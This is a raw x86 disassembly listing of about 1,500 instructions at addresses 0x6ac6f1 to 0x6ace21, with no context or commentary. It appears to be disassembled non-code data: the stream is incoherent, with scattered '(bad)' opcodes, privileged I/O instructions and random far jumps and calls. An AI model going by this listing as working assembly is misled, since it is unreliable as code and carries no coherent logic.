  6ac6f1:	sub    ch,dh
  6ac6f3:	jo     0x6ac759
  6ac6f5:	test   ebx,esp
  6ac6f7:	mov    dl,0x93
  6ac6f9:	icebp  
  6ac6fa:	xchg   ebp,eax
  6ac6fb:	mov    ebp,0x810548c7
  6ac700:	icebp  
  6ac701:	ret    
  6ac702:	fist   DWORD PTR [ebx-0x41e21684]
  6ac708:	sbb    eax,0xf203317d
  6ac70d:	out    0x48,al
  6ac70f:	aam    0x44
  6ac711:	scas   eax,DWORD PTR es:[edi]
  6ac712:	xor    cl,ah
  6ac714:	pop    edx
  6ac715:	xchg   edi,eax
  6ac716:	mov    esi,0xfaa0e6d2
  6ac71b:	jbe    0x6ac726
  6ac71d:	add    BYTE PTR ds:0xb12fa8fd,ch
  6ac723:	lahf   
  6ac724:	mov    esp,edi
  6ac726:	scas   eax,DWORD PTR es:[edi]
  6ac727:	push   cs
  6ac728:	fwait
  6ac729:	xor    al,0x6c
  6ac72b:	cmp    DWORD PTR [eax-0x23dbb31f],0xd2d5b893
  6ac735:	fist   WORD PTR [ebx-0x7d89e3a1]
  6ac73b:	sub    al,0x89
  6ac73d:	cmp    eax,0xbcac8270
  6ac742:	inc    ebp
  6ac743:	sbb    DWORD PTR [edx-0x74c0d552],edx
  6ac749:	outs   dx,DWORD PTR ds:[esi]
  6ac74a:	out    dx,al
  6ac74b:	in     eax,dx
  6ac74c:	sub    DWORD PTR [eax],eax
  6ac74e:	or     DWORD PTR [eax-0x33],ebp
  6ac751:	xor    BYTE PTR [eax+0xa58e5b7],dh
  6ac757:	arpl   WORD PTR [esi+0x5972cc0e],di
  6ac75d:	cmp    eax,0xd240df08
  6ac762:	bound  esp,QWORD PTR [eax+eax*2+0x225ea1f1]
  6ac769:	dec    esp
  6ac76a:	jle    0x6ac713
  6ac76c:	adc    BYTE PTR [ebx-0x5],0xc8
  6ac770:	mov    sp,0xbd32
  6ac774:	(bad)
  6ac777:	and    dl,0xef
  6ac77a:	sbb    BYTE PTR [edx+0x6bd5def4],bh
  6ac780:	xchg   ebx,eax
  6ac781:	jb     0x6ac750
  6ac783:	mov    bl,0x1d
  6ac785:	or     DWORD PTR [ecx+eiz*2-0x42],edi
  6ac789:	jp     0x6ac725
  6ac78b:	test   eax,0x6d3a306f
  6ac790:	scas   eax,DWORD PTR es:[edi]
  6ac791:	pop    ebx
  6ac792:	in     al,0x72
  6ac794:	(bad)  
  6ac795:	sub    esi,ebp
  6ac797:	mov    dl,0xde
  6ac799:	sub    BYTE PTR ds:0x6cf33293,cl
  6ac79f:	mov    esi,0x5db1556e
  6ac7a4:	adc    DWORD PTR [eax],esp
  6ac7a6:	fisttp WORD PTR [ebx+0x585a7b13]
  6ac7ac:	mov    dl,0x50
  6ac7ae:	xor    esi,ebp
  6ac7b0:	xlat   BYTE PTR ds:[ebx]
  6ac7b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ac7b2:	or     esi,DWORD PTR [esi+ecx*8-0x1c]
  6ac7b6:	xchg   ecx,eax
  6ac7b7:	pop    edx
  6ac7b8:	push   edx
  6ac7b9:	adc    eax,0x250cc3a5
  6ac7be:	push   es
  6ac7bf:	or     esp,DWORD PTR ds:0x9b8ad610
  6ac7c5:	sub    eax,0x2a819287
  6ac7ca:	fs jle 0x6ac79d
  6ac7cd:	lods   al,BYTE PTR ds:[esi]
  6ac7ce:	test   DWORD PTR [ebp-0x70a64ac5],eax
  6ac7d4:	nop
  6ac7d5:	pushf  
  6ac7d6:	pusha  
  6ac7d7:	sbb    al,0xe3
  6ac7d9:	shl    cl,1
  6ac7db:	cwde   
  6ac7dc:	or     BYTE PTR [edx-0x5ea7ede],dh
  6ac7e2:	das    
  6ac7e3:	addr16 aas 
  6ac7e5:	push   0x814e4209
  6ac7ea:	or     eax,0x1cb8db54
  6ac7ef:	ret    
  6ac7f0:	das    
  6ac7f1:	pop    ebp
  6ac7f2:	rol    BYTE PTR ds:[edi+0x2a],cl
  6ac7f6:	dec    edx
  6ac7f7:	arpl   bx,ax
  6ac7f9:	je     0x6ac838
  6ac7fb:	hlt    
  6ac7fc:	lods   eax,DWORD PTR ds:[esi]
  6ac7fd:	xor    DWORD PTR [ebx+ebx*4+0x21865728],ebx
  6ac804:	test   eax,0x1c890479
  6ac809:	icebp  
  6ac80a:	lea    ecx,[esp+eiz*8]
  6ac80d:	or     BYTE PTR [esi+0x5cd3a135],bh
  6ac813:	ds call 0xdf87:0x26c11a66
  6ac81b:	xor    DWORD PTR [esi-0x18f06207],esp
  6ac821:	jecxz  0x6ac7e5
  6ac823:	or     eax,0xe119b6b
  6ac828:	lods   eax,DWORD PTR ds:[esi]
  6ac829:	or     ah,BYTE PTR [edx-0x40]
  6ac82c:	mov    ds:0x38b7ca98,eax
  6ac831:	mov    al,ds:0x2f2e08e7
  6ac836:	pop    esi
  6ac837:	int3   
  6ac838:	xchg   esp,eax
  6ac839:	or     edi,ebp
  6ac83b:	cmc    
  6ac83c:	mov    esi,DWORD PTR [ebx+ecx*8]
  6ac83f:	call   0x21197528
  6ac844:	stc    
  6ac845:	or     dh,ah
  6ac847:	sub    al,BYTE PTR [esi+0x56]
  6ac84a:	sub    al,0x98
  6ac84c:	test   DWORD PTR [edi-0x832f807],0x275927c0
  6ac856:	lods   eax,DWORD PTR ds:[esi]
  6ac857:	dec    edi
  6ac858:	loope  0x6ac7eb
  6ac85a:	xchg   ebx,eax
  6ac85b:	mov    edx,0x1826c551
  6ac860:	dec    esp
  6ac861:	sar    BYTE PTR [edx-0x71ea6779],cl
  6ac867:	lahf   
  6ac868:	add    al,dh
  6ac86a:	mov    dl,0xe1
  6ac86c:	fld    QWORD PTR [ecx-0x3f]
  6ac86f:	jno    0x6ac8ce
  6ac871:	enter  0xf77,0xda
  6ac875:	inc    esi
  6ac876:	add    edi,DWORD PTR [eax]
  6ac878:	imul   ebp,DWORD PTR ds:0x234a0047,0xc0ecee7b
  6ac882:	pop    ebx
  6ac883:	pop    edx
  6ac884:	nop
  6ac885:	(bad)  
  6ac886:	pop    ecx
  6ac887:	out    dx,eax
  6ac888:	add    eax,DWORD PTR [edi+0x11356786]
  6ac88e:	sbb    DWORD PTR [ebx],ebx
  6ac890:	dec    ecx
  6ac891:	push   esp
  6ac892:	pop    ds
  6ac893:	call   0x5740:0x67675b1a
  6ac89a:	mov    ecx,DWORD PTR [edx+0x22]
  6ac89d:	sub    edi,DWORD PTR [esi-0x15c7681f]
  6ac8a3:	inc    esp
  6ac8a4:	into   
  6ac8a5:	(bad)  
  6ac8a6:	jg     0x6ac8b9
  6ac8a8:	repnz mul DWORD PTR [ecx+0x1e]
  6ac8ac:	jmp    0xe52f88dc
  6ac8b1:	in     eax,dx
  6ac8b2:	stos   DWORD PTR es:[edi],eax
  6ac8b3:	fcom   DWORD PTR [ebp+0x657bce12]
  6ac8b9:	jns    0x6ac8e7
  6ac8bb:	jecxz  0x6ac86d
  6ac8bd:	scas   al,BYTE PTR es:[edi]
  6ac8be:	push   es
  6ac8bf:	(bad)  
  6ac8c0:	xlat   BYTE PTR ds:[ebx]
  6ac8c1:	dec    eax
  6ac8c2:	addr16 je 0x6ac8df
  6ac8c5:	scas   al,BYTE PTR es:[edi]
  6ac8c6:	(bad)  [ecx-0x18]
  6ac8c9:	mov    es,edx
  6ac8cb:	sub    al,0x36
  6ac8cd:	or     ecx,DWORD PTR [ecx]
  6ac8cf:	mov    dl,BYTE PTR [ebp+eiz*8+0x35]
  6ac8d3:	add    eax,esp
  6ac8d5:	movups xmm5,XMMWORD PTR [edi+eax*2]
  6ac8d9:	ins    DWORD PTR es:[edi],dx
  6ac8da:	mov    ds:0x6baf8372,al
  6ac8df:	mov    ecx,0x884a67e4
  6ac8e4:	adc    DWORD PTR [ecx-0x7a83854f],ebp
  6ac8ea:	shl    DWORD PTR [eax+0x5f],0xae
  6ac8ee:	jnp    0x6ac878
  6ac8f0:	xchg   DWORD PTR [eax],ebx
  6ac8f2:	adc    DWORD PTR [ecx],esp
  6ac8f4:	inc    edi
  6ac8f5:	ret    0x1618
  6ac8f8:	lods   eax,DWORD PTR ds:[esi]
  6ac8f9:	xor    al,0x51
  6ac8fb:	out    0xd5,eax
  6ac8fd:	std    
  6ac8fe:	iret   
  6ac8ff:	stos   BYTE PTR es:[edi],al
  6ac900:	mov    ecx,0xf6b38b17
  6ac905:	rcr    DWORD PTR [ebx+0x6e2a137],cl
  6ac90b:	cmp    eax,0xedc86c06
  6ac910:	aaa    
  6ac911:	ja     0x6ac8ae
  6ac913:	or     DWORD PTR [eax+0x28568a6e],eax
  6ac919:	scas   eax,DWORD PTR es:[edi]
  6ac91a:	sahf   
  6ac91b:	imul   eax,DWORD PTR [edi],0xffffffd2
  6ac91e:	test   eax,0x4220e1fd
  6ac923:	cmp    BYTE PTR [eax-0x784ae855],dh
  6ac929:	aad    0x4e
  6ac92b:	mov    esi,0x1e0c8af6
  6ac930:	(bad)  
  6ac931:	fcomp  QWORD PTR [eax+0x5aa45e2d]
  6ac937:	call   0x4f63281
  6ac93c:	cmc    
  6ac93d:	stos   DWORD PTR es:[edi],eax
  6ac93e:	push   ebx
  6ac93f:	lods   al,BYTE PTR ds:[esi]
  6ac940:	repz imul eax,DWORD PTR [ebp-0x6dd6bcdc],0x999ece05
  6ac94b:	iret   
  6ac94c:	jns    0x6ac906
  6ac94e:	xchg   esp,eax
  6ac94f:	lahf   
  6ac950:	xor    DWORD PTR [esi+0x5c],edi
  6ac953:	stos   BYTE PTR es:[edi],al
  6ac954:	mov    ah,0x5
  6ac956:	test   DWORD PTR [eax+0x10],esp
  6ac959:	mov    al,ds:0x81e3f8ae
  6ac95e:	mov    bl,0x55
  6ac960:	mov    cl,0x8f
  6ac962:	icebp  
  6ac963:	pop    ss
  6ac964:	mov    esp,ds
  6ac966:	sub    DWORD PTR [eax-0x154378f9],0xffffffdc
  6ac96d:	xor    BYTE PTR [edi],al
  6ac96f:	sub    ch,cl
  6ac971:	or     eax,DWORD PTR [ebp+0x58]
  6ac974:	aam    0x3c
  6ac976:	div    DWORD PTR [ebx-0x23841c76]
  6ac97c:	add    edi,DWORD PTR [ecx+0x62fbf1c6]
  6ac982:	clc    
  6ac983:	push   ecx
  6ac984:	repz in al,0xaf
  6ac987:	gs sbb edx,edx
  6ac98a:	adc    edx,DWORD PTR [ecx]
  6ac98c:	icebp  
  6ac98d:	mov    ebx,eax
  6ac98f:	sar    ch,cl
  6ac991:	dec    eax
  6ac992:	fistp  DWORD PTR ds:0x506d4bd0
  6ac998:	scas   al,BYTE PTR es:[edi]
  6ac999:	lods   eax,DWORD PTR ds:[esi]
  6ac99a:	xor    BYTE PTR [ebp+0x39dedb81],dl
  6ac9a0:	div    BYTE PTR [edi-0x1a42d6b5]
  6ac9a6:	push   ecx
  6ac9a7:	lahf   
  6ac9a8:	test   al,0x28
  6ac9aa:	and    BYTE PTR [ecx+0x28],0xc1
  6ac9ae:	jg     0x6ac95c
  6ac9b0:	adc    BYTE PTR [ebx],ch
  6ac9b2:	repz sub ah,BYTE PTR [ebp-0x44787f26]
  6ac9b9:	out    0xe3,al
  6ac9bb:	add    dl,ch
  6ac9bd:	daa    
  6ac9be:	push   DWORD PTR [ecx]
  6ac9c0:	cmp    ebp,DWORD PTR [edx]
  6ac9c2:	cmp    DWORD PTR [ecx-0x78],edx
  6ac9c5:	ja     0x6aca29
  6ac9c7:	sub    esp,DWORD PTR [esi+0x543a2cc5]
  6ac9cd:	lods   al,BYTE PTR ds:[esi]
  6ac9ce:	pop    eax
  6ac9cf:	test   eax,0x8c7269a3
  6ac9d4:	push   esp
  6ac9d5:	popf   
  6ac9d6:	add    DWORD PTR [ebx+0x185250b],esi
  6ac9dc:	int3   
  6ac9dd:	jmp    0xd17e:0x4812b164
  6ac9e4:	rcr    bl,0xb8
  6ac9e7:	lds    ebp,FWORD PTR [ecx+0x23]
  6ac9ea:	add    DWORD PTR [esi-0x1c],edx
  6ac9ed:	xadd   DWORD PTR [esi-0x21],ebp
  6ac9f1:	add    cl,BYTE PTR [ebp+edi*2+0x5fdfcc9b]
  6ac9f8:	aad    0xc4
  6ac9fa:	add    al,0x99
  6ac9fc:	and    al,0x7b
  6ac9fe:	mov    bl,0x58
  6aca00:	test   dl,0xb3
  6aca03:	xchg   ebx,eax
  6aca04:	pop    es
  6aca05:	popa   
  6aca06:	cmp    al,0x77
  6aca08:	xchg   DWORD PTR [ebp+eax*1+0x24],esp
  6aca0c:	gs jp  0x6ac9a2
  6aca0f:	ja     0x6aca5a
  6aca11:	pop    edi
  6aca12:	jp     0x6ac9d5
  6aca14:	es into 
  6aca16:	dec    ebp
  6aca17:	jbe    0x6ac9f5
  6aca19:	cmp    al,BYTE PTR [edi]
  6aca1b:	iret   
  6aca1c:	(bad)  
  6aca1d:	xor    dh,ch
  6aca1f:	mov    dl,0xe
  6aca21:	(bad)  
  6aca22:	sbb    dh,al
  6aca24:	into   
  6aca25:	xor    bh,0x5e
  6aca28:	shl    BYTE PTR [edx+0x5f],cl
  6aca2b:	outs   dx,DWORD PTR ds:[esi]
  6aca2c:	adc    bh,cl
  6aca2e:	dec    edx
  6aca2f:	and    eax,0xf261034a
  6aca34:	cli    
  6aca35:	mov    ebx,0x32a5ecb9
  6aca3a:	enter  0x255b,0x6f
  6aca3e:	(bad)  
  6aca3f:	mov    edi,0xd63a135
  6aca44:	outs   dx,BYTE PTR ds:[esi]
  6aca45:	nop
  6aca46:	dec    esp
  6aca47:	or     al,0xd2
  6aca49:	push   0x7d
  6aca4b:	aaa    
  6aca4c:	fwait
  6aca4d:	jb     0x6ac9f4
  6aca4f:	neg    BYTE PTR [ebp-0x21]
  6aca52:	stc    
  6aca53:	repnz sbb al,0x5
  6aca56:	sti    
  6aca57:	adc    DWORD PTR [edx+0x67dc4453],0x402dee8c
  6aca61:	pop    si
  6aca63:	fdivr  st(5),st
  6aca65:	cdq    
  6aca66:	int3   
  6aca67:	mov    edx,fs
  6aca69:	jg     0x6aca92
  6aca6b:	les    esp,FWORD PTR [ebx]
  6aca6d:	(bad)  
  6aca6e:	imul   ebp,DWORD PTR [ecx+0x3a],0x6b3d7ed3
  6aca75:	mov    dl,0x50
  6aca77:	shl    ch,0x71
  6aca7a:	aaa    
  6aca7b:	(bad)  
  6aca7c:	jmp    0x6aca31
  6aca7e:	pop    es
  6aca7f:	adc    al,BYTE PTR [ecx-0x2c]
  6aca82:	cmp    al,0x2c
  6aca84:	or     al,0x5d
  6aca86:	xchg   esp,eax
  6aca87:	push   edx
  6aca88:	out    0x71,al
  6aca8a:	ins    BYTE PTR es:[edi],dx
  6aca8b:	clc    
  6aca8c:	dec    esi
  6aca8d:	mul    DWORD PTR [ebx+edi*2+0x290cca58]
  6aca94:	ss mov ebp,0x5dcfb8e1
  6aca9a:	arpl   WORD PTR cs:[edx+0x44],di
  6aca9e:	neg    ah
  6acaa0:	jg     0x6aca8b
  6acaa2:	pusha  
  6acaa3:	sbb    dl,BYTE PTR [esi-0x57]
  6acaa6:	jmp    0x6acae8
  6acaa8:	imul   cl
  6acaaa:	in     eax,dx
  6acaab:	add    al,0xa2
  6acaad:	cmp    ecx,0xfffffff9
  6acab0:	push   0x19
  6acab2:	imul   eax,DWORD PTR [edx-0x3360bd2],0x39
  6acab9:	ja     0x6acabb
  6acabb:	xchg   ecx,eax
  6acabc:	cld    
  6acabd:	call   0x48d29e99
  6acac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6acac3:	inc    ebp
  6acac4:	repnz pop ds
  6acac6:	cdq    
  6acac7:	push   0x8186be1a
  6acacc:	xchg   ah,al
  6acace:	sbb    al,0x5c
  6acad0:	sub    eax,0xa8deb1e6
  6acad5:	sub    al,0xfd
  6acad7:	or     al,0x17
  6acad9:	repz mov al,ds:0xbbfd8e4a
  6acadf:	adc    eax,DWORD PTR [eax-0xe]
  6acae2:	fs dec ebx
  6acae4:	sub    al,0x7a
  6acae6:	mov    cl,0xc4
  6acae8:	mov    esi,DWORD PTR [edx]
  6acaea:	adc    ebp,DWORD PTR [edx]
  6acaec:	jbe    0x6acb3a
  6acaee:	repnz fisubr WORD PTR [ebx+0x31]
  6acaf2:	out    dx,al
  6acaf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6acaf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6acaf5:	lahf   
  6acaf6:	frstor [ecx+eiz*8+0x386b447a]
  6acafd:	add    al,0xe0
  6acaff:	xchg   BYTE PTR [edi+0x73],cl
  6acb02:	xchg   edi,eax
  6acb03:	sbb    eax,0x272aa1c8
  6acb08:	pop    ds
  6acb09:	call   0xa20e:0xff5f613f
  6acb10:	shl    eax,1
  6acb12:	jge    0x6acb07
  6acb14:	mov    ds,ebp
  6acb16:	icebp  
  6acb17:	icebp  
  6acb18:	xor    eax,0xd3c97cb6
  6acb1d:	out    0x30,al
  6acb1f:	sbb    dh,cl
  6acb21:	adc    al,0xe2
  6acb23:	into   
  6acb24:	push   es
  6acb25:	sbb    BYTE PTR [edx],bh
  6acb27:	js     0x6acb64
  6acb29:	mov    edi,0x5189587e
  6acb2e:	dec    edx
  6acb2f:	adc    eax,0x25887f17
  6acb34:	out    dx,eax
  6acb35:	rol    DWORD PTR [edx],1
  6acb37:	(bad)  
  6acb38:	dec    esi
  6acb39:	in     al,0x3f
  6acb3b:	add    cl,BYTE PTR [esi-0x1429e30d]
  6acb41:	out    dx,al
  6acb42:	xchg   edx,eax
  6acb43:	int    0xbb
  6acb45:	dec    ebx
  6acb46:	mov    al,0xbf
  6acb48:	imul   ebx,DWORD PTR [ecx+0x343875a4],0xffffff89
  6acb4f:	sub    al,0xdf
  6acb51:	and    BYTE PTR [ebp+0x42],dh
  6acb54:	push   edx
  6acb55:	jmp    0x6acaf2
  6acb57:	inc    eax
  6acb58:	gs ds das 
  6acb5b:	hlt    
  6acb5c:	popf   
  6acb5d:	pop    es
  6acb5e:	dec    ecx
  6acb5f:	pushf  
  6acb60:	test   DWORD PTR [edi+0x70],edx
  6acb63:	test   DWORD PTR [ecx],0xad179b55
  6acb69:	or     DWORD PTR [ebx+0x781e47e3],edi
  6acb6f:	mov    ah,0x32
  6acb71:	out    dx,al
  6acb72:	push   ds
  6acb73:	jns    0x6acbda
  6acb75:	repz test ah,bl
  6acb78:	mov    BYTE PTR [esi-0x3f],dh
  6acb7b:	gs (bad) 
  6acb7d:	pop    ss
  6acb7e:	daa    
  6acb7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6acb80:	mov    al,BYTE PTR [ebp-0x4a268215]
  6acb86:	scas   eax,DWORD PTR es:[edi]
  6acb87:	bound  esp,QWORD PTR [ecx-0x601a0a96]
  6acb8d:	inc    ebx
  6acb8e:	jge    0x6acb3f
  6acb90:	pushf  
  6acb91:	or     eax,0x76f5f76
  6acb96:	and    ecx,DWORD PTR [esi+ebp*8+0x54]
  6acb9a:	(bad)  
  6acb9b:	(bad)  
  6acb9c:	dec    DWORD PTR [esp+ebp*4-0x675cefc]
  6acba3:	mov    DWORD PTR [ecx+0x3f],eax
  6acba6:	fidiv  DWORD PTR [eax]
  6acba8:	dec    esp
  6acba9:	js     0x6acbf6
  6acbab:	mov    dl,BYTE PTR [ecx]
  6acbad:	cmp    DWORD PTR [eax],esi
  6acbaf:	les    ebp,FWORD PTR [edx]
  6acbb1:	mov    DWORD PTR [edx-0x17],edx
  6acbb4:	call   0xfd2d781d
  6acbb9:	cmp    dh,BYTE PTR [ebp-0x53]
  6acbbc:	and    cl,BYTE PTR [edx-0x9]
  6acbbf:	stos   BYTE PTR es:[edi],al
  6acbc0:	lods   eax,DWORD PTR ds:[esi]
  6acbc1:	ja     0x6acc1b
  6acbc3:	int3   
  6acbc4:	add    DWORD PTR [edx-0x19d83d18],edx
  6acbca:	loopne 0x6acb6d
  6acbcc:	shr    DWORD PTR ds:0x14a9c981,1
  6acbd2:	outs   dx,DWORD PTR ds:[esi]
  6acbd3:	adc    eax,0x1e565ff9
  6acbd8:	push   esp
  6acbd9:	aam    0x3
  6acbdb:	loopne 0x6acc53
  6acbdd:	das    
  6acbde:	jno    0x6acb70
  6acbe0:	pop    ecx
  6acbe1:	mov    eax,0x84f62596
  6acbe6:	and    al,0xce
  6acbe8:	dec    ebx
  6acbe9:	cmp    ch,bh
  6acbeb:	dec    ebp
  6acbec:	je     0x6acc21
  6acbee:	add    BYTE PTR [ebx],ch
  6acbf0:	cmp    ebp,ebp
  6acbf2:	or     ecx,ecx
  6acbf4:	add    eax,0x492c9e53
  6acbf9:	dec    ecx
  6acbfa:	inc    esi
  6acbfb:	xchg   ebx,eax
  6acbfc:	push   edi
  6acbfd:	(bad)  
  6acbfe:	in     eax,0x3f
  6acc00:	std    
  6acc01:	xor    al,ch
  6acc03:	(bad)  
  6acc04:	out    dx,al
  6acc05:	adc    al,0xe6
  6acc07:	sub    DWORD PTR [edi],eax
  6acc09:	mov    dh,0x14
  6acc0b:	call   0xc831:0xd2097912
  6acc12:	jle    0x6acbed
  6acc14:	shl    cl,cl
  6acc16:	pop    ebx
  6acc17:	xor    ebx,DWORD PTR [edi+eiz*1-0x5678e5eb]
  6acc1e:	loop   0x6acc81
  6acc20:	push   ebp
  6acc21:	(bad)  
  6acc23:	lods   al,BYTE PTR ds:[esi]
  6acc24:	jns    0x6acc2a
  6acc26:	or     BYTE PTR ds:0x656077ed,bl
  6acc2c:	mov    esp,0x41f3e3ee
  6acc31:	in     al,0x33
  6acc33:	ja     0x6acca5
  6acc35:	cmp    cl,BYTE PTR ds:0x569beb80
  6acc3b:	bswap  edi
  6acc3d:	out    dx,al
  6acc3e:	hlt    
  6acc3f:	push   ebx
  6acc40:	jl     0x6acc46
  6acc42:	xlat   BYTE PTR ds:[ebx]
  6acc43:	js     0x6acc34
  6acc45:	hlt    
  6acc46:	push   0xa18a417f
  6acc4b:	xor    edx,DWORD PTR [ebx]
  6acc4d:	test   DWORD PTR [edi-0x46361e5e],esp
  6acc53:	mov    WORD PTR [edx-0x7e],fs
  6acc56:	fadd   QWORD PTR [ecx+0x2e]
  6acc59:	sti    
  6acc5a:	and    al,0x2f
  6acc5c:	inc    esp
  6acc5d:	or     al,0x12
  6acc5f:	and    al,0x26
  6acc61:	or     al,0xce
  6acc63:	cld    
  6acc64:	dec    ecx
  6acc65:	hlt    
  6acc66:	jnp    0x6acbfe
  6acc68:	sbb    cl,bl
  6acc6a:	out    dx,eax
  6acc6b:	loop   0x6acc1c
  6acc6d:	ins    DWORD PTR es:[edi],dx
  6acc6e:	pusha  
  6acc6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6acc70:	sub    ch,bl
  6acc72:	or     bl,ah
  6acc74:	out    dx,eax
  6acc75:	push   ecx
  6acc76:	stc    
  6acc77:	mov    esp,0x2a7c96c0
  6acc7c:	push   ds
  6acc7d:	lds    ebx,FWORD PTR [edx+0x62]
  6acc80:	dec    ecx
  6acc81:	add    ebx,DWORD PTR [ecx-0x2e01650a]
  6acc87:	mov    bl,0x71
  6acc89:	mov    ds:0xd61e4896,eax
  6acc8e:	out    0x3f,al
  6acc90:	(bad)  
  6acc91:	call   DWORD PTR [esi]
  6acc93:	pop    ss
  6acc94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6acc95:	fst    QWORD PTR [eax]
  6acc97:	mov    BYTE PTR [edi+0x1e],ah
  6acc9a:	xchg   edi,eax
  6acc9b:	cmp    bh,0xde
  6acc9e:	sub    ah,cl
  6acca0:	add    al,0xeb
  6acca2:	imul   edi,DWORD PTR [edi+esi*1+0xef7248],0xffffffea
  6accaa:	retf   0xf53a
  6accad:	xor    cl,BYTE PTR gs:[ebp+0x686aa0dc]
  6accb4:	jmp    0x94fb:0xd74b1196
  6accbb:	aad    0x8f
  6accbd:	adc    BYTE PTR [edx-0x523e48fc],bh
  6accc3:	jo     0x6acc6b
  6accc5:	inc    esp
  6accc6:	jp     0x6acd2a
  6accc8:	xchg   edx,eax
  6accc9:	push   ss
  6accca:	sbb    al,bh
  6acccc:	lds    esi,FWORD PTR [eax+0x4d]
  6acccf:	inc    esi
  6accd0:	dec    ecx
  6accd1:	in     eax,dx
  6accd2:	xchg   edi,eax
  6accd3:	sub    DWORD PTR [edx],0xb728a1f
  6accd9:	mov    ah,0xf9
  6accdb:	push   eax
  6accdc:	test   al,0x1e
  6accde:	out    dx,al
  6accdf:	call   0x8a4c2ff
  6acce4:	mov    ecx,0xd0ed2972
  6acce9:	xchg   esi,eax
  6accea:	and    eax,0x458d77aa
  6accef:	rcl    bh,1
  6accf1:	add    bh,BYTE PTR [ebx-0x32d6c89e]
  6accf7:	popa   
  6accf8:	call   0x7ccd844f
  6accfd:	ja     0x6accc5
  6accff:	sahf   
  6acd00:	pop    edx
  6acd01:	jno    0x6acd11
  6acd03:	out    dx,eax
  6acd04:	icebp  
  6acd05:	cs xchg ebx,eax
  6acd07:	arpl   WORD PTR [esi],cx
  6acd09:	xchg   ebp,eax
  6acd0a:	add    eax,0xd0ad8183
  6acd0f:	xchg   edi,eax
  6acd10:	ja     0x6accfb
  6acd12:	jne    0x6acd8c
  6acd14:	jecxz  0x6acd22
  6acd16:	in     eax,0x5b
  6acd18:	cdq    
  6acd19:	push   cs
  6acd1a:	pushf  
  6acd1b:	mov    dl,0x88
  6acd1d:	dec    eax
  6acd1e:	out    0x3,eax
  6acd20:	ret    
  6acd21:	iret   
  6acd22:	hlt    
  6acd23:	inc    ecx
  6acd24:	push   es
  6acd25:	data16 and al,0x25
  6acd28:	add    al,0xa5
  6acd2a:	jbe    0x6acce4
  6acd2c:	dec    edi
  6acd2d:	std    
  6acd2e:	jb     0x6acd60
  6acd30:	pop    eax
  6acd31:	push   0x8289a1ed
  6acd36:	(bad)  
  6acd37:	push   ebp
  6acd38:	idiv   DWORD PTR [eax+0x1aee1626]
  6acd3e:	into   
  6acd3f:	xor    edx,ebp
  6acd41:	iret   
  6acd42:	sbb    ah,BYTE PTR [ebx+edx*4-0x11]
  6acd46:	lods   eax,DWORD PTR ds:[esi]
  6acd47:	xchg   DWORD PTR [ebx+ebp*4+0x779a38f6],eax
  6acd4e:	inc    edx
  6acd4f:	(bad)  
  6acd50:	push   cs
  6acd51:	dec    edx
  6acd52:	rcr    DWORD PTR [esi],1
  6acd54:	sti    
  6acd55:	xchg   edi,eax
  6acd56:	xchg   DWORD PTR [esi],esp
  6acd58:	fs pop esp
  6acd5a:	cli    
  6acd5b:	mov    al,0xd0
  6acd5d:	sub    BYTE PTR ds:0x95eb429f,dh
  6acd63:	repz cmp bh,BYTE PTR [eax+0xd]
  6acd67:	jle    0x6acd36
  6acd69:	hlt    
  6acd6a:	test   eax,0x1e67d973
  6acd6f:	or     bh,BYTE PTR [esi+eiz*2+0x53]
  6acd73:	dec    edx
  6acd74:	out    0x40,al
  6acd76:	jmp    0x32744b52
  6acd7b:	test   BYTE PTR [ebp+0x70],0x34
  6acd7f:	mov    BYTE PTR [eax-0x6c],bl
  6acd82:	nop
  6acd83:	xchg   ecx,eax
  6acd84:	or     bl,al
  6acd86:	push   edi
  6acd87:	daa    
  6acd88:	enter  0x4ad,0x8c
  6acd8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6acd8d:	das    
  6acd8e:	stc    
  6acd8f:	loope  0x6acd76
  6acd91:	sub    bh,BYTE PTR [edi]
  6acd93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6acd94:	loopne 0x6acdc3
  6acd96:	sub    edi,DWORD PTR [ecx-0x20]
  6acd99:	push   ecx
  6acd9a:	and    eax,ebp
  6acd9c:	mov    al,0xdc
  6acd9e:	xchg   BYTE PTR [ebx],bh
  6acda0:	outs   dx,DWORD PTR ds:[esi]
  6acda1:	mov    dh,0x21
  6acda3:	dec    ebx
  6acda4:	mov    edi,0x6837d2b5
  6acda9:	enter  0xcd00,0xba
  6acdad:	add    al,0xc9
  6acdaf:	call   0xe929:0x5559e425
  6acdb6:	and    esi,DWORD PTR [edi]
  6acdb8:	mov    esp,0x1bbcd148
  6acdbd:	mov    dh,BYTE PTR [esp+edi*2]
  6acdc0:	cli    
  6acdc1:	sbb    eax,0xd9194800
  6acdc6:	mov    bh,0x49
  6acdc8:	ins    BYTE PTR es:[edi],dx
  6acdc9:	pop    ecx
  6acdca:	call   0xa57db945
  6acdcf:	xchg   esi,eax
  6acdd0:	lock jne 0x6acdb4
  6acdd3:	pop    ebx
  6acdd4:	arpl   WORD PTR [ebx-0x321fca79],di
  6acdda:	jge    0x6ace0e
  6acddc:	cli    
  6acddd:	push   0xffffffd4
  6acddf:	popa   
  6acde0:	in     al,dx
  6acde1:	sub    BYTE PTR [ebp+0x39],0x4c
  6acde5:	std    
  6acde6:	and    BYTE PTR [edi+ebp*4+0x4a],0x76
  6acdeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6acdec:	mov    eax,ds:0x7f10f2b0
  6acdf1:	pusha  
  6acdf2:	jno    0x6acd97
  6acdf4:	in     al,dx
  6acdf5:	jo     0x6acdaa
  6acdf7:	and    eax,0x5920e5ce
  6acdfc:	pop    ss
  6acdfd:	and    BYTE PTR [edi+ecx*1+0x4355c1c7],bl
  6ace04:	icebp  
  6ace05:	sub    dl,BYTE PTR [ecx-0x687bc5cd]
  6ace0b:	sti    
  6ace0c:	xor    BYTE PTR [ebp-0x79],bh
  6ace0f:	push   ss
  6ace10:	mov    esi,DWORD PTR [edi]
  6ace12:	mov    al,0xe7
  6ace14:	std    
  6ace15:	sbb    ebp,DWORD PTR ds:0xa26abebc
  6ace1b:	mov    BYTE PTR [eax+0x697f9e5a],dl
  6ace21:	mov    ch,0xd8
